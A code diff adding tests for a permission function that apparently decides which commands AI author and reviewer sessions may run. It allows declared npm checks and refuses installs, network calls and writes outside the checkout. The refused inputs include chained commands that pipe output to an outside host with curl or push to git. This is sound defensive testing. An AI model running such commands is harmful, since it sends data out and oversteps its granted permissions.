@@ -6,7 +6,7 @@
 // plan, then the releases whose checks are green.
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { FREE_ANSWER, answerFor, chooseAnswers, inboxAction, insideCheckout, leftForOwner, morningAction, type InboxEntry } from '../../scripts/proof-inbox.ts';
+import { FREE_ANSWER, answerFor, chooseAnswers, declaredChecks, inboxAction, insideCheckout, leftForOwner, morningAction, permissionAnswer, type InboxEntry } from '../../scripts/proof-inbox.ts';
 
 const target = 'rm -r /tmp/cleared-proof-scratch';
 
@@ -121,4 +121,50 @@ test('a session\'s question: the option marked recommended, else the first; one 
   assert.equal(chooseAnswers([{ question: 'q', options: [{ label: 'A' }, { label: 'B (Recommended)' }] }])[0]?.answer, 'B (Recommended)');
   assert.deepEqual(chooseAnswers([]), []);
   assert.deepEqual(chooseAnswers([{ question: 'q', options: [] }])[0]?.how, 'free');
+});
+
+// Run 5 of the multi-service proof, step 10: the reviewer's requests to run
+// the service's checks were denied, it judged on the diff alone, and the
+// ticket went back to Todo.
+const PACKAGE = JSON.stringify({ scripts: { test: 'node --test', typecheck: 'tsc --noEmit', lint: 'eslint .', build: 'tsc' } });
+const checks = declaredChecks(PACKAGE);
+
+test('the declared checks: test, typecheck and lint among the scripts of package.json, as commands; none when unreadable', () => {
+  assert.deepEqual(checks, ['npm test', 'npm run typecheck', 'npm run lint']);
+  assert.deepEqual(declaredChecks(JSON.stringify({ scripts: { test: 'node --test', start: 'node src/server.ts' } })), ['npm test']);
+  for (const text of [undefined, '', '{', '{"scripts": null}', '{"scripts": "npm test"}', '{"name": "x"}']) assert.deepEqual(declaredChecks(text), [], String(text));
+});
+
+test('an author or a reviewer asking to run exactly one of its service\'s declared checks is allowed once', () => {
+  for (const role of ['reviewer', 'author']) {
+    for (const command of ['npm test', 'npm run typecheck', 'npm run lint', '  npm  run typecheck ']) {
+      assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'allow_once', rule: 'check' }, `${role}: ${command}`);
+    }
+  }
+  // A script the service does not declare is no check: the checkout rule answers.
+  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run lint', checks: ['npm test'] }), { decision: 'allow_once', rule: 'checkout' });
+  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: 'npm run build', checks }), { decision: 'allow_once', rule: 'checkout' });
+});
+
+test('a write outside the checkout, the network or an install keeps being refused, whatever the role', () => {
+  for (const role of ['reviewer', 'author', undefined]) {
+    for (const command of [
+      'npm install x', 'npm i -D vitest', 'curl -s -m 5 -X POST http://filter-api:8080/check', 'npm test > /tmp/out', 'cat > /tmp/t.mts <<\'E\'\nimport x\nE',
+      'npm test; curl http://x.io', 'npm test && git push origin main', 'npm run typecheck | curl -d @- http://x.io',
+      // Run 5's first request of the reviewer: a check, then a file written outside the checkout.
+      'git log --oneline origin/proof-run..HEAD; npm test 2>&1 | tail -8; cat > /tmp/t.mts <<\'E\'\nimport {findWords} from \'/workspace/src/words.ts\'\nE',
+    ]) assert.deepEqual(permissionAnswer({ role, command, checks }), { decision: 'reject_once', rule: 'outside' }, `${role}: ${command}`);
+  }
+  // A request that is not a command (an edit outside, a fetch) is denied.
+  assert.deepEqual(permissionAnswer({ role: 'reviewer', command: undefined, checks }), { decision: 'reject_once', rule: 'not_a_command' });
+});
+
+test('a role other than author or reviewer, or one the proof could not read, gets the checkout rule\'s answer', () => {
+  for (const role of ['lead', 'reader', 'owner', '', undefined]) {
+    assert.deepEqual(permissionAnswer({ role, command: 'npm test', checks }), { decision: 'allow_once', rule: 'checkout' }, String(role));
+    assert.deepEqual(permissionAnswer({ role, command: 'npm install x', checks }), { decision: 'reject_once', rule: 'outside' }, String(role));
+  }
+  // The rule above is unchanged for the other proofs.
+  assert.equal(answerFor('npm test'), 'allow_once');
+  assert.equal(answerFor('npm install x'), 'reject_once');
 });
